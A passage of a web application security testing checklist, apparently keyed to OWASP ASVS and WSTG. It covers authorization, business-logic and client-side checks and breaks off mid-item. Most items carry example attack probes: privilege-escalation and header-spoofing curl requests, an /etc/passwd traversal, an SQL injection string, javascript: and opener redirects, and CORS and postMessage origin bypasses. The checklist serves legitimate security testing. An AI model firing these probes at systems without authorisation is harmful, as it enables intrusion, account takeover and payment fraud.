  *Steps:*
  1. Get the authorization documentation.
  2. Make sure it lists function-level rules by consumer permission.
  3. Make sure it lists data-specific rules by resource attribute.
  4. Compare five rules with real behavior.
  *Example:* `Build a role-to-endpoint matrix from the document, then replay it with Autorize or ZAP Access Control Testing.`  
  *Expected:* The documentation defines function-level and data-specific access rules. The application follows them.  
  *Refs:* owasp_top10: A01:2025; asvs: V8.1.1; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-284

- [ ] **WEB-AUTHZ-002** Read the field-level access rules  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Finds missing rules for who may read or write each field.  
  *Steps:*
  1. Get the authorization documentation.
  2. Make sure it defines read and write rules for each sensitive field.
  3. Look for rules that depend on object state, such as status.
  4. Compare with the API schema.
  *Example:* `Compare the OpenAPI schema (readOnly, writeOnly) with the documented field matrix.`  
  *Expected:* Field-level read and write rules are documented, including state-dependent rules.  
  *Refs:* owasp_top10: A01:2025; asvs: V8.1.2; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-915

- [ ] **WEB-AUTHZ-003** Read the contextual and environmental decision rules  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L3  
  *Objective:* Finds missing rules for time, place, IP and device in access decisions.  
  *Steps:*
  1. Get the authentication and authorization documentation.
  2. Find the attributes used: time, location, IP address and device.
  3. Make sure the document lists thresholds and actions: allow, challenge, deny, step-up.
  *Example:* `Review the risk engine rules and the design document side by side.`  
  *Expected:* The attributes, risk thresholds and actions are documented for authentication and authorization decisions.  
  *Refs:* asvs: V8.1.3, V8.1.4; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-284

- [ ] **WEB-AUTHZ-004** Test function-level access for each role  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds functions that users can call without explicit permission.  
  *Steps:*
  1. Map all functions and admin pages for each role.
  2. Log in as a low role. Call the functions of a higher role with a proxy.
  3. Call the same requests with no session.
  4. Change HTTP methods: GET, POST, PUT, DELETE.
  5. Compare every response with the response of the allowed role.
  *Example:* `Burp Autorize: set the low-privilege cookie and browse as admin; or POST /admin/addUser (userID=fakeuser&role=3) with a user cookie.`  
  *Expected:* Only roles with explicit permission can use each function. Others get 401 or 403 for every method.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-ATHZ-02, WSTG-ATHZ-03; asvs: V8.2.1; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-862, CWE-863, CWE-285, CWE-425, CWE-306; capec: CAPEC-1, CAPEC-58, CAPEC-122

- [ ] **WEB-AUTHZ-005** Test forced browsing without a session  
  *Severity if fail:* High | *Type:* Automated  
  *Objective:* Finds pages and operations that need no login.  
  *Steps:*
  1. Collect all URLs from crawl, JavaScript and API docs.
  2. Request each URL without a session.
  3. Request admin and internal paths.
  4. Check the files in storage buckets that hold uploads.
  *Example:* `ffuf -w urls.txt -u https://target/FUZZ -mc 200,204,301,302,403 ; ZAP: Access Control Testing add-on with an unauthenticated context.`  
  *Expected:* Non-public URLs return 401 or redirect to login. Stored private files are not public.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-ATHZ-02; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-425, CWE-862, CWE-306; capec: CAPEC-1

- [ ] **WEB-AUTHZ-006** Test privilege escalation by parameter and profile changes  
  *Severity if fail:* Critical | *Type:* Manual  
  *Objective:* Finds hidden fields, groups or conditions that a user can change to gain privileges.  
  *Steps:*
  1. Look for group, profile, role and flag fields in requests, hidden fields and responses.
  2. Change a value, such as profile=SysGuest to SysAdmin.
  3. Change the group ID or order ID to one outside your group.
  4. Try to add yourself to a higher role.
  *Example:* `POST /user/viewOrder.jsp groupID=grp002&orderID=0001 from a grp001 user; also change <input name='profile' value='SysAdmin'>.`  
  *Expected:* The server does not trust client values for role, group or privilege. A user cannot raise their own privilege.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-ATHZ-03; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-269, CWE-266, CWE-639, CWE-472; capec: CAPEC-233, CAPEC-58

- [ ] **WEB-AUTHZ-007** Test field-level access and mass assignment  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds objects where users can read or write fields they should not.  
  *Steps:*
  1. Compare the fields in responses for different roles.
  2. Add extra fields such as role, isAdmin and balance to update requests.
  3. Change read-only fields.
  4. Check fields that depend on state, such as status.
  *Example:* `curl -X PATCH https://target/api/users/me -b 'session=<user>' -H 'Content-Type: application/json' -d '{"role":"admin","isAdmin":true}'`  
  *Expected:* Users cannot read or write fields without permission. Unknown and protected fields are ignored or rejected.  
  *Refs:* owasp_top10: A01:2025; asvs: V8.2.3; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-915, CWE-863  
  *See:* WEB-INJ-022

- [ ] **WEB-AUTHZ-008** Test adaptive access controls at login and during a session  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds contextual controls that apply only at login or not at all.  
  *Steps:*
  1. Read the documented context rules.
  2. Log in from a new device and an unusual place.
  3. Change the IP, device or time during an active session.
  4. Check the action: step-up, deny or revoke.
  *Example:* `Move the test session to a different VPN country and call a sensitive endpoint.`  
  *Expected:* Context rules apply when a session starts and during the session, with the documented action.  
  *Refs:* asvs: V8.2.4; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-284

- [ ] **WEB-AUTHZ-009** Check that authorization is enforced on the server  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds access control that exists only in client-side code.  
  *Steps:*
  1. Find controls hidden in JavaScript or by CSS.
  2. Call hidden admin URLs with curl.
  3. Remove or change client-side checks with a proxy.
  4. Send API calls that the UI never makes.
  *Example:* `curl -i https://target/app/admin_getappInfo -b 'session=<user>'`  
  *Expected:* The server decides access on every request. Changes in client code do not change the result.  
  *Refs:* owasp_top10: A01:2025; asvs: V8.3.1; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-602, CWE-603, CWE-862

- [ ] **WEB-AUTHZ-010** Check that permission changes apply at once  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds tokens or caches that keep old permissions after a change.  
  *Steps:*
  1. Log in as a user and keep the session or token.
  2. Remove a role from the user as administrator.
  3. Call a function of that role at once.
  4. Check the lifetime of the token or cache.
  *Example:* `curl -i -H 'Authorization: Bearer <old jwt>' https://target/api/admin/report right after the role is removed.`  
  *Expected:* A permission change takes effect at once. If not, there is a control that alerts on the action and reverts it.  
  *Refs:* asvs: V8.3.2; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-863, CWE-285

- [ ] **WEB-AUTHZ-011** Check that back-end calls use the original user permissions  
  *Severity if fail:* High | *Type:* Code Review | *Level:* ASVS L3  
  *Objective:* Finds services that act with their own rights on behalf of a user.  
  *Steps:*
  1. Map the calls between internal services for one user action.
  2. Call the action with a low-privilege user token.
  3. Look at the token that the second service gets.
  4. Check that the second service enforces the user rights.
  *Example:* `Trace with a proxy or service mesh logs: compare the Authorization headers on hop 1 and hop 2.`  
  *Expected:* Services pass on the user identity and apply the user permissions. No service acts as a confused deputy.  
  *Refs:* owasp_top10: A01:2025; asvs: V8.3.3; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-441, CWE-863

- [ ] **WEB-AUTHZ-012** Test tenant isolation in multi-tenant applications  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds operations that affect other tenants.  
  *Steps:*
  1. Create two tenants with a user in each.
  2. Use IDs, names and tokens of tenant A in requests as a user of tenant B.
  3. Change a tenant header or subdomain value.
  4. Check search, export and bulk functions.
  *Example:* `curl -b 'session=<tenantB user>' -H 'X-Tenant-ID: tenantA' https://target/api/invoices`  
  *Expected:* A user can never read or change data of another tenant.  
  *Refs:* owasp_top10: A01:2025; asvs: V8.4.1; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-639, CWE-284, CWE-653

- [ ] **WEB-AUTHZ-013** Check layers of control on administrative interfaces  
  *Severity if fail:* High | *Type:* Config Review | *Level:* ASVS L3  
  *Objective:* Finds admin interfaces that rely only on network location.  
  *Steps:*
  1. List admin interfaces.
  2. Reach them from a trusted network with a low role.
  3. Check for ongoing identity checks, device posture and risk analysis.
  4. Check that network location alone is not enough.
  *Example:* `curl -H 'X-Forwarded-For: 127.0.0.1' https://target/admin ; review the admin gateway policy.`  
  *Expected:* Admin access needs several layers: continuous identity checks, device posture and risk analysis. Network location is never the only factor.  
  *Refs:* wstg: WSTG-ATHZ-02; asvs: V8.4.2; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-291, CWE-284

- [ ] **WEB-AUTHZ-014** Test bypass with special request headers  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds access control that trusts headers such as X-Original-URL or X-Forwarded-For.  
  *Steps:*
  1. Send a blocked admin URL with X-Original-URL set to it, with a harmless request path.
  2. Do the same with X-Rewrite-URL.
  3. Add X-Forwarded-For, X-Client-IP and X-Remote-Addr with 127.0.0.1, ::1 and RFC1918 addresses.
  4. Try IPv4-mapped IPv6 values.
  *Example:* `curl -i https://target/ -H 'X-Original-URL: /admin' ; curl -i https://target/admin -H 'X-Forwarded-For: 127.0.0.1'`  
  *Expected:* Header values do not change the path or the client identity. The blocked page stays blocked.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-ATHZ-02, WSTG-ATHZ-03; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-290, CWE-291, CWE-288

- [ ] **WEB-AUTHZ-015** Test directory traversal and file inclusion in file parameters  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds parameters that read files outside the allowed folder.  
  *Steps:*
  1. Find parameters that name files, templates or pages, also in cookies.
  2. Send ../ sequences with 3 to 8 levels.
  3. Send encoded forms: %2e%2e%2f, double encoding and backslashes.
  4. Try an absolute path and a remote URL.
  5. On Windows, try UNC paths and trailing characters.
  *Example:* `ffuf -w LFI-Jhaddix.txt -u 'https://target/index.php?file=FUZZ' -fs <size> ; curl 'https://target/getUserProfile.jsp?item=../../../../etc/passwd'`  
  *Expected:* The application accepts only expected file names. Traversal and remote includes are rejected after full decoding.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-ATHZ-01; cwe: CWE-22, CWE-23, CWE-36; capec: CAPEC-64  
  *See:* WEB-INJ-013

- [ ] **WEB-AUTHZ-016** Check URL path matching in authorization rules  
  *Severity if fail:* High | *Type:* Code Review  
  *Objective:* Finds rules that use partial string matching on URLs.  
  *Steps:*
  1. Read the code for startswith, endswith, contains and indexOf on paths.
  2. Send encoded, double-slash and dot-segment paths to protected URLs.
  3. Try different case and trailing characters.
  *Example:* `curl -i 'https://target//admin' ; curl -i 'https://target/%2e%2e/admin' ; curl -i 'https://target/admin;.css'`  
  *Expected:* Authorization uses the normalized path and exact rules. Encoded paths and dot segments do not skip a check.  
  *Refs:* wstg: WSTG-ATHZ-03; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-551, CWE-863

- [ ] **WEB-AUTHZ-017** Check deny by default and checks on every request  
  *Severity if fail:* High | *Type:* Config Review  
  *Objective:* Finds new or unlisted routes and methods that have no access control.  
  *Steps:*
  1. List all routes from the code or API description.
  2. Find routes with no access rule.
  3. Call them without rights, using POST, PUT and DELETE too.
  4. Check that one shared mechanism enforces checks on every request.
  *Example:* `grep -rn 'permitAll\|@PermitAll\|skip_authorization' src/ ; compare the OpenAPI paths with the security config.`  
  *Expected:* Access is denied when no rule matches. Every request goes through the same authorization check, including AJAX and API calls.  
  *Refs:* owasp_top10: A01:2025; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-862, CWE-284

- [ ] **WEB-AUTHZ-018** Check logging and alerts for access control failures  
  *Severity if fail:* Low | *Type:* Config Review  
  *Objective:* Finds access control failures that nobody sees, and automated abuse that is not limited.  
  *Steps:*
  1. Send 20 forbidden requests.
  2. Read the logs for each failure.
  3. Check for an alert after repeated failures.
  4. Check for a rate limit on API and controller access.
  *Example:* `for i in $(seq 20); do curl -s -o /dev/null -b 'session=<user>' https://target/admin; done; grep 403 /var/log/app/access.log | tail`  
  *Expected:* Access control failures are logged. Repeated failures raise an alert. API and controller access has a rate limit.  
  *Refs:* owasp_top10: A01:2025; cwe: CWE-778, CWE-770


## BIZ

- [ ] **WEB-BIZ-001** Test forged requests that skip the frontend workflow  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds backend endpoints that accept forged requests without the checks the frontend enforces.  
  *Steps:*
  1. Observe HTTP traffic for guessable or sequential values, such as an incrementing transaction ID.
  2. Observe for hidden fields or parameters indicating debug or development functionality.
  3. Submit a forged request directly to the backend endpoint, skipping the frontend screens.
  4. Guess or change a hidden field value, such as a discount flag, and resubmit.
  *Example:* `Change a hidden field senior_discount=false to senior_discount=true and resubmit directly to the checkout endpoint`  
  *Expected:* The backend independently re-derives discounts, prices and flags and rejects requests that were not produced by the real workflow.  
  *Refs:* wstg: WSTG-BUSL-02; cheatsheet: Business_Logic_Security_Cheat_Sheet; cwe: CWE-472, CWE-602; capec: CAPEC-137

- [ ] **WEB-BIZ-002** Test non-editable and hidden fields for integrity bypass  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds hidden, read-only or dropdown-bound fields that the server trusts without re-validation.  
  *Steps:*
  1. Capture a request containing a hidden field, a disabled form control, or a value shown only in a dropdown.
  2. Submit the request with that field changed to a value not offered by the interface.
  3. Submit a value for a field that only an administrator should be able to set.
  4. Check whether application logs can be modified by submitting crafted log-bound input.
  *Example:* `Change a hidden price=20.00 field to price=0.01, or a role dropdown value to a role never shown to this user`  
  *Expected:* The server treats hidden and non-editable fields as untrusted and revalidates every value against the business rule.  
  *Refs:* wstg: WSTG-BUSL-03; cheatsheet: Business_Logic_Security_Cheat_Sheet; cwe: CWE-472; capec: CAPEC-162

- [ ] **WEB-BIZ-003** Test time-dependent processes for information leakage and race windows  
  *Severity if fail:* Medium | *Type:* Automated  
  *Objective:* Finds processing time differences that leak information or create a window to exploit a transaction.  
  *Steps:*
  1. Identify a process whose completion time might depend on a secret, such as login or password reset.
  2. Measure and compare response time for valid and invalid inputs across many requests.
  3. Identify a time-sensitive transaction, such as a price quote with an expiry, and test extending it past the expected window.
  *Example:* `Automated timing script sending repeated login attempts with valid and invalid usernames, comparing mean response time`  
  *Expected:* Response time does not depend on whether input is valid, and time-sensitive transactions are strictly bound to their stated window server-side.  
  *Refs:* wstg: WSTG-BUSL-04; cheatsheet: Business_Logic_Security_Cheat_Sheet; cwe: CWE-208

- [ ] **WEB-BIZ-004** Test functions that should set a hard limit on repeated use  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds coupon, bonus or similar functions missing a server-side limit on how many times they can run.  
  *Steps:*
  1. Identify a function documented or expected to run only once or a limited number of times per user.
  2. Call the function repeatedly, for example reapplying a one-time discount code.
  3. Check whether the limit is enforced per account, per session or globally as required.
  *Example:* `Reapply the same one-time discount code repeatedly in separate checkout requests`  
  *Expected:* The limit on the number of times a function can be used is enforced server-side and cannot be bypassed by repeating the request.  
  *Refs:* wstg: WSTG-BUSL-05; asvs: V2.3.2; cheatsheet: Business_Logic_Security_Cheat_Sheet; cwe: CWE-799; capec: CAPEC-166

- [ ] **WEB-BIZ-005** Test multi-step workflows for step skipping and reordering  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds workflows that can be completed out of order or with required steps skipped entirely.  
  *Steps:*
  1. Map every step of a multi-step workflow and the request associated with each step.
  2. Call a later-stage endpoint directly without completing the earlier required steps.
  3. Replay or reorder captured requests to reach an unauthorized or unintended state.
  4. Submit a status or phase parameter with an invalid, future, or unauthorized value.
  *Example:* `Call the order-fulfillment endpoint directly without a preceding confirmed-payment step; replay step 3 before step 2`  
  *Expected:* The server tracks workflow state itself and rejects a request for any step whose prerequisites were not completed in order.  
  *Refs:* owasp_top10: A06:2025; wstg: WSTG-BUSL-06; asvs: V2.3.1; cheatsheet: Business_Logic_Security_Cheat_Sheet; cwe: CWE-841; capec: CAPEC-74

- [ ] **WEB-BIZ-006** Test transactional operations for atomic all-or-nothing behavior  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds multi-step business transactions that can be left in a partially applied state.  
  *Steps:*
  1. Identify a business operation composed of multiple writes, such as a transfer that debits one account and credits another.
  2. Interrupt the operation partway, for example by closing the connection after the first write.
  3. Check whether the operation rolls back completely or leaves an inconsistent partial state.
  *Example:* `Terminate the connection immediately after the debit step of a funds transfer and check both account balances afterward`  
  *Expected:* The business operation runs inside a transaction that either completes in full or rolls back to the prior correct state.  
  *Refs:* asvs: V2.3.3; cwe: CWE-696

- [ ] **WEB-BIZ-007** Test limited-quantity resources for double-booking  
  *Severity if fail:* High | *Type:* Automated | *Level:* ASVS L2  
  *Objective:* Finds booking or allocation logic missing a locking mechanism for a limited resource.  
  *Steps:*
  1. Identify a limited-quantity resource, such as a seat, slot or inventory item.
  2. Send two or more concurrent requests to reserve the same resource.
  3. Check whether more reservations succeed than the resource actually has capacity for.
  *Example:* `Fire 20 concurrent requests for the last available seat using a tool such as Turbo Intruder or ffuf with -c`  
  *Expected:* A business-logic-level lock or atomic conditional update prevents more reservations than the resource has capacity for.  
  *Refs:* asvs: V2.3.4; cheatsheet: Business_Logic_Security_Cheat_Sheet; cwe: CWE-362, CWE-367; capec: CAPEC-26, CAPEC-29

- [ ] **WEB-BIZ-008** Test high-value flows for required multi-user approval  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds high-value or safety-critical business actions that a single user can complete alone.  
  *Steps:*
  1. Identify high-value flows, such as a large monetary transfer or an access-level change.
  2. Try to complete the flow with a single compromised account and no second approver.
  3. Check whether the application requires a second, independent approval for the action.
  *Example:* `Submit a large fund transfer as a single authenticated user with no second approval step triggered`  
  *Expected:* High-value business flows require a second, independent approval before the action takes effect.  
  *Refs:* asvs: V2.3.5; cwe: CWE-862

- [ ] **WEB-BIZ-009** Test functions for anti-automation and rate-limit controls  
  *Severity if fail:* Medium | *Type:* Automated | *Level:* ASVS L2  
  *Objective:* Finds application functions reachable at excessive volume without a rate limit or anti-automation control.  
  *Steps:*
  1. Identify functions that could be abused by automation, such as a search, coupon check or export.
  2. Send a high volume of requests to the function using an automated tool.
  3. Check whether the application applies a rate limit, CAPTCHA or account lock after excessive use.
  *Example:* `ffuf -u https://target/api/coupon?code=FUZZ -w codes.txt -t 50 and observe whether throttling begins`  
  *Expected:* The application enforces a rate limit or anti-automation control before quota exhaustion, data exfiltration or denial-of-service can occur.  
  *Refs:* asvs: V2.4.1; cwe: CWE-799, CWE-770; capec: CAPEC-125, CAPEC-112

- [ ] **WEB-BIZ-010** Test transaction submission timing against expected human speed  
  *Severity if fail:* Medium | *Type:* Automated | *Level:* ASVS L3  
  *Objective:* Finds workflows missing a check for unrealistically fast, automated transaction submission.  
  *Steps:*
  1. Identify a multi-step flow with a timing assumption, such as filling a form or confirming a purchase.
  2. Automate the flow to complete every step far faster than a human could.
  3. Check whether the application detects and blocks the unrealistic timing.
  *Example:* `Automated script submitting a multi-field form in under 200 milliseconds, repeated across many sessions`  
  *Expected:* The application detects submissions faster than realistic human timing and blocks or challenges them.  
  *Refs:* asvs: V2.4.2; wstg: WSTG-BUSL-04; cwe: CWE-799

- [ ] **WEB-BIZ-011** Test active defenses against combined application misuse  
  *Severity if fail:* Low | *Type:* Manual  
  *Objective:* Finds applications that take no defensive action after a user sends many clearly malicious requests.  
  *Steps:*
  1. Send a sequence of mild then increasingly malicious probes: an invalid ID, a tick character, a verb change.
  2. Continue probing with a blatant SQL injection or XSS payload.
  3. Observe whether the application changes behavior, such as adding delays, extra authentication, or blocking the session.
  *Example:* `Sequence: /file?id=999 -> /file?id=' -> change GET to POST -> duplicate a parameter -> submit ' OR 1=1-- and watch for a defensive response`  
  *Expected:* The application detects the pattern of misuse and responds with increased scrutiny, delays, or a block rather than processing every request normally.  
  *Refs:* wstg: WSTG-BUSL-07; cheatsheet: Business_Logic_Security_Cheat_Sheet; cwe: CWE-799

- [ ] **WEB-BIZ-012** Test payment quantity and price fields for business logic tampering  
  *Severity if fail:* Critical | *Type:* Manual  
  *Objective:* Finds checkout logic that trusts client-supplied quantity, price or currency values.  
  *Steps:*
  1. Add an item to the basket and intercept the add-to-basket or checkout request.
  2. Change the quantity to a negative number and resubmit.
  3. If a price or currency field is present, change it to a lower value or another currency.
  4. If a secure hash or encrypted field protects the transaction, try submitting the request without it.
  *Example:* `item_id=1&quantity=-5 ; item_id=1&quantity=5&price=0.01 ; currency=XXX where USD is expected ; strip the secure_hash parameter entirely`  
  *Expected:* The server re-derives price, quantity and currency from trusted data server-side and rejects a request without a valid integrity hash.  
  *Refs:* owasp_top10: A06:2025; wstg: WSTG-BUSL-10; cheatsheet: Business_Logic_Security_Cheat_Sheet, Transaction_Authorization_Cheat_Sheet; cwe: CWE-472, CWE-345; capec: CAPEC-137

- [ ] **WEB-BIZ-013** Test discount codes for guessability and stacking abuse  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds discount code systems with guessable codes, no brute-force protection, or unsafe stacking.  
  *Steps:*
  1. Try common discount code patterns such as TEST10 or the company name.
  2. Submit many sequential or incremented codes to check for brute-force protection.
  3. Apply more than one discount code to the same order and check whether they stack below cost.
  *Example:* `code=TEST10 ; code=SORRY10 ; try sequential codes SAVE01..SAVE99 ; apply two valid codes to the same basket`  
  *Expected:* Discount codes are unpredictable, rate-limited against brute force, and cannot be stacked to push the price below cost.  
  *Refs:* wstg: WSTG-BUSL-10; cheatsheet: Business_Logic_Security_Cheat_Sheet; cwe: CWE-799; capec: CAPEC-112

- [ ] **WEB-BIZ-014** Test payment race conditions and double-spend windows  
  *Severity if fail:* Critical | *Type:* Automated  
  *Objective:* Finds payment flows vulnerable to a race between a check and a write on a balance or stock value.  
  *Steps:*
  1. Identify a payment or balance operation with a check-then-act pattern, such as spending a gift card balance.
  2. Send multiple concurrent requests that use the same balance or the same one-time resource.
  3. Check whether more value or resource is consumed than the balance actually allows.
  *Example:* `Fire 20 concurrent gift-card redemption requests against a balance that should cover only one redemption`  
  *Expected:* The balance check and debit run inside a single atomic transaction or a conditional update, so concurrent requests cannot overdraw it.  
  *Refs:* wstg: WSTG-BUSL-10; cheatsheet: Business_Logic_Security_Cheat_Sheet; cwe: CWE-362, CWE-367; capec: CAPEC-26


## CLIENT

- [ ] **WEB-CLIENT-001** Test redirect parameters for open redirect  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds client-side redirect logic that sends a user to an attacker domain from an unvalidated parameter.  
  *Steps:*
  1. Find client-side code that reads a redirect target from the URL hash, query string or a parameter.
  2. Submit an external domain as the redirect target and confirm the browser navigates there.
  3. If plain domains are blocked, try the javascript: scheme in the same parameter.
  *Example:* `https://target/?#www.malicious-example.invalid ; https://target/?#javascript:alert(document.cookie) ; redir=https://malicious-example.invalid`  
  *Expected:* Redirect destinations are checked against an allowlist of trusted hostnames before navigation, and dangerous schemes are rejected.  
  *Refs:* wstg: WSTG-CLNT-04; asvs: V3.7.2, V3.7.3; cheatsheet: Unvalidated_Redirects_and_Forwards_Cheat_Sheet; cwe: CWE-601; capec: CAPEC-154

- [ ] **WEB-CLIENT-002** Test CORS configuration for overly permissive origin handling  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds CORS responses that reflect an arbitrary origin or allow the null origin with credentials.  
  *Steps:*
  1. Send a request with an attacker-controlled Origin header to each API endpoint.
  2. Check whether Access-Control-Allow-Origin reflects the submitted origin or returns a wildcard.
  3. If credentials are used, check whether Access-Control-Allow-Credentials is true alongside a reflected or null origin.
  4. Test a crafted subdomain, for example target.com.attacker.com, against a regex-based allowlist.
  *Example:* `Origin: https://attacker.example ; Origin: null (from a sandboxed iframe) ; Origin: https://example.com.attacker.com against regex /\.example.com$/`  
  *Expected:* The server allows only an explicit allowlist of trusted origins, never reflects an arbitrary or null origin together with credentials.  
  *Refs:* wstg: WSTG-CLNT-07; asvs: V3.4.2; cheatsheet: HTML5_Security_Cheat_Sheet; cwe: CWE-942, CWE-346

- [ ] **WEB-CLIENT-003** Test clickjacking protections with an embedding iframe  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds pages that can be framed by another origin and tricked into unintended clicks.  
  *Steps:*
  1. Create a test page that loads the target in an iframe.
  2. Load the test page in a browser and confirm whether the target renders inside the frame.
  3. Check the Content-Security-Policy frame-ancestors directive and the X-Frame-Options header on the response.
  4. Repeat the test with JavaScript disabled to rule out a frame-busting script as the only defense.
  *Example:* `<iframe src="https://target" width="400" height="400"></iframe> ; check header Content-Security-Policy: frame-ancestors 'self'`  
  *Expected:* The response sets frame-ancestors or X-Frame-Options so the page cannot be framed by an untrusted origin, even with JavaScript disabled.  
  *Refs:* owasp_top10: A05:2025; wstg: WSTG-CLNT-09; asvs: V3.4.6; cheatsheet: Clickjacking_Defense_Cheat_Sheet; cwe: CWE-1021; capec: CAPEC-103

- [ ] **WEB-CLIENT-004** Test WebSocket origin checks and transport security  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds WebSocket endpoints that accept connections from any origin or run over unencrypted ws.  
  *Steps:*
  1. Identify WebSocket usage from the client source or the browser network panel.
  2. Try to open a WebSocket connection from a different origin and check if the server accepts it.
  3. Check whether the endpoint uses the wss scheme instead of plain ws.
  4. Fuzz WebSocket messages for the same injection classes used on normal HTTP input.
  *Example:* `new WebSocket("wss://target/socket") opened with a forged Origin header from a separate test page`  
  *Expected:* The server validates the Origin header on the handshake, enforces wss, and treats WebSocket input with the same injection controls as HTTP.  
  *Refs:* wstg: WSTG-CLNT-10; asvs: V1.2.1; cwe: CWE-1385, CWE-346; capec: CAPEC-94  
  *See:* WEB-HTTP-009

- [ ] **WEB-CLIENT-005** Test postMessage handlers for origin and input validation  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds window message listeners that trust the sender origin or the message content without checks.  
  *Steps:*
  1. Review client-side code for a message event listener and note how it checks event.origin.
  2. From an attacker page, send a postMessage with an origin check bypass, for example a domain containing the expected substring.
  3. Send a message with an unexpected structure or an invalid, non-JSON payload and check if the handler discards it.
  4. Send a message containing an embedded script and check if it is evaluated as HTML.
  *Example:* `iframe1.contentWindow.postMessage(payload,"*") from https://www.owasp.org.attacker.example to pass an indexOf(".owasp.org") check`  
  *Expected:* The receiving handler checks the full origin string with strict equality, discards invalid-syntax messages, and treats data as untrusted text.  
  *Refs:* wstg: WSTG-CLNT-11; asvs: V3.5.5; cheatsheet: HTML5_Security_Cheat_Sheet; cwe: CWE-20, CWE-346

- [ ] **WEB-CLIENT-006** Test browser storage for sensitive data and injection risk  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds localStorage, sessionStorage or IndexedDB entries holding sensitive data or session tokens.  
  *Steps:*
  1. Open developer tools and list all keys and values in localStorage, sessionStorage and IndexedDB.
  2. Check whether any value is a session token, password or other sensitive data.
  3. Trigger a stored or reflected XSS proof-of-concept and confirm it can read these values.
  *Example:* `for(let i=0;i<localStorage.length;i++){console.log(localStorage.key(i),localStorage.getItem(localStorage.key(i)))}`  
  *Expected:* No session token or sensitive data is stored in localStorage, sessionStorage or IndexedDB; session tokens use HttpOnly cookies instead.  
  *Refs:* wstg: WSTG-CLNT-12; cheatsheet: HTML5_Security_Cheat_Sheet; cwe: CWE-922

- [ ] **WEB-CLIENT-007** Test same-origin JavaScript resources for cross-site script inclusion  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds a script resource that leaks sensitive data when included cross-origin as a classic script tag.  
  *Steps:*
  1. Identify script resources that return sensitive data as a global variable, JSONP or an array literal.
  2. From an attacker-controlled page, include the script with a script tag while the victim session cookie is sent.
  3. Read the resulting global variable or array prototype from the attacker page and confirm the leaked data.
  *Example:* `<script src="https://target/internal/api.js"></script> then read window.secret from the attacker page`  
  *Expected:* Sensitive endpoints require a non-GET method or a custom header, are not valid JavaScript, and set a restrictive SameSite cookie.  
  *Refs:* wstg: WSTG-CLNT-13; asvs: V3.5.6, V3.5.7; cwe: CWE-346; capec: CAPEC-111

- [ ] **WEB-CLIENT-008** Test window.open links for reverse tabnabbing  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds links opened in a new tab that can redirect the original tab through window.opener.  
  *Steps:*
  1. Find links or window.open calls that open user-controlled or third-party URLs in a new tab.
  2. Check the HTML source for the rel attribute on target="_blank" links.
  3. Open the link and confirm whether the opened page can set window.opener.location.
  *Example:* `<script>window.opener.location="https://malicious-example.invalid";</script> in the page opened by a user-supplied link`  
  *Expected:* Every link that opens a new tab sets rel="noopener noreferrer" or the browser default behavior is relied on and confirmed.  
  *Refs:* wstg: WSTG-CLNT-14; cwe: CWE-1022

- [ ] **WEB-CLIENT-009** Test cookie attributes for Secure, HttpOnly and SameSite  
  *Severity if fail:* Medium | *Type:* Config Review | *Level:* ASVS L1  
  *Objective:* Finds session or sensitive cookies missing the Secure, HttpOnly or correct SameSite attribute.  
  *Steps:*
  1. Log in and inspect the Set-Cookie header for every session or sensitive cookie.
  2. Confirm the Secure attribute is present and the cookie uses the __Host- or __Secure- prefix.
  3. Confirm the HttpOnly attribute is present on cookies not needed by client-side script.
  4. Confirm the SameSite attribute matches the purpose of the cookie.
  *Example:* `curl -I https://target/login then inspect Set-Cookie: session=...; Secure; HttpOnly; SameSite=Strict`  
